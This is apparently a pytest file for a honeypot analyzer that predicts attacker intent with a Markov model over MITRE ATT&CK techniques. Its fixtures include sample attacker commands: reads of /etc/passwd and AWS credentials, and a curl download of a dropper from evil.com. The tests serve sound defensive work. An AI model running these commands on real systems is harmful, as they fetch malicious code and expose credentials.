"""Тесты модуля Марковского прогнозирования тактических намерений (Markovian Intent Engine)."""
from __future__ import annotations

import pytest
from fastapi.testclient import TestClient

from honeymind.analyzer import Analyzer
from honeymind.api import create_app
from honeymind.markov import MarkovIntentEngine, TECHNIQUES


def test_markov_engine_probabilities_sum_to_one():
    engine = MarkovIntentEngine(alpha=0.05)
    probs = engine.transition_probabilities("T1082")
    assert probs, "Распределение не должно быть пустым"
    total = sum(probs.values())
    assert pytest.approx(total, 0.001) == 1.0


def test_markov_engine_predict_next_recon_to_credentials():
    engine = MarkovIntentEngine(alpha=0.05)
    # Из разведки (T1082) наиболее вероятен переход к креденшелам (T1552.001) или sudo (T1548.003)
    preds = engine.predict_next("T1082", top_k=3)
    assert len(preds) == 3
    # Проверяем, что элементы отсортированы по убыванию вероятности
    assert preds[0].probability >= preds[1].probability >= preds[2].probability
    top_techs = [p.technique for p in preds]
    assert "T1552.001" in top_techs or "T1548.003" in top_techs
    # Все поля заполнены
    assert preds[0].name and preds[0].tactic and preds[0].description


def test_markov_engine_predict_dropper_to_chmod_and_exec():
    engine = MarkovIntentEngine(alpha=0.05)
    # Из скачивания дроппера (T1105) почти всегда следует chmod +x (T1222.002)
    preds = engine.predict_next("T1105", top_k=3)
    top_tech = preds[0].technique
    assert top_tech == "T1222.002"
    assert preds[0].tactic == "Defense Evasion"


def test_markov_entropy_bounds():
    engine = MarkovIntentEngine(alpha=0.05)
    h_recon = engine.calculate_entropy("T1082")
    assert 0.0 <= h_recon <= 1.0


def test_markov_sequence_scripted_low_tdi():
    engine = MarkovIntentEngine(alpha=0.05)
    # Типичная последовательность ботнета: разведка -> поиск паролей -> эксфильтрация -> зачистка
    seq = ["T1082", "T1552.001", "T1041", "T1070.004"]
    res = engine.analyze_sequence(seq)
    assert res.current_technique == "T1070.004"
    assert res.operator_style == "scripted"
    assert res.tactical_deviation_index < 0.35
    assert len(res.transition_chain) == 3


def test_markov_sequence_anomalous_manual_exploratory():
    engine = MarkovIntentEngine(alpha=0.05)
    # Аномальная нетипичная последовательность переходов
    seq = ["T1485", "T1082", "T1574.006", "T1046"]
    res = engine.analyze_sequence(seq)
    assert res.tactical_deviation_index > 0.65
    assert res.operator_style == "manual_exploratory"


def test_markov_online_learning():
    engine = MarkovIntentEngine(alpha=0.05, prior_weight=1.0)
    # До обучения вероятность редкого перехода мала
    p_before = engine.transition_probabilities("T1082").get("T1485", 0.0)
    # Наблюдаем многократно этот переход в реальных сессиях
    for _ in range(30):
        engine.observe_transition("T1082", "T1485", weight=2.0)
    p_after = engine.transition_probabilities("T1082").get("T1485", 0.0)
    assert p_after > p_before * 5


def test_analyzer_session_enriches_intent_prediction():
    analyzer = Analyzer()
    events = [
        {"type": "command", "command": "uname -a"},
        {"type": "command", "command": "cat /etc/passwd"},
        {"type": "command", "command": "cat /root/.aws/credentials"},
    ]
    res = analyzer.analyze_session(events)
    assert "intent_prediction" in res
    intent = res["intent_prediction"]
    assert intent["current_technique"] in ("T1552.001", "T1552.004", "T1082", "T1087.001")
    assert len(intent["next_likely_techniques"]) >= 1
    assert "summary_ru" in intent
    assert "[" in res["summary"]  # Прогноз включен в сводку сессии


def test_api_predict_markov_intent_endpoint():
    app = create_app(Analyzer())
    client = TestClient(app)

    # 1. Запрос по техникам напрямую
    r1 = client.post("/predict/markov_intent", json={"techniques": ["T1082", "T1552.001"]})
    assert r1.status_code == 200
    data1 = r1.json()
    assert data1["current_technique"] == "T1552.001"
    assert data1["next_likely_techniques"][0]["technique"] == "T1041"

    # 2. Запрос по сырым событиям
    r2 = client.post("/predict/markov_intent", json={"events": [
        {"type": "command", "command": "uname -a"},
        {"type": "command", "command": "curl http://evil.com/dropper.sh -o /tmp/d.sh"},
    ]})
    assert r2.status_code == 200
    data2 = r2.json()
    assert data2["current_technique"] == "T1105"
    assert data2["next_likely_techniques"][0]["technique"] == "T1222.002"

    # 3. Эндпоинт /session содержит блок intent_prediction
    r3 = client.post("/session", json={"events": [
        {"type": "command", "command": "uname -a"},
        {"type": "command", "command": "id"},
    ]})
    assert r3.status_code == 200
    data3 = r3.json()
    assert "intent_prediction" in data3
    assert data3["intent_prediction"]["current_technique"] is not None
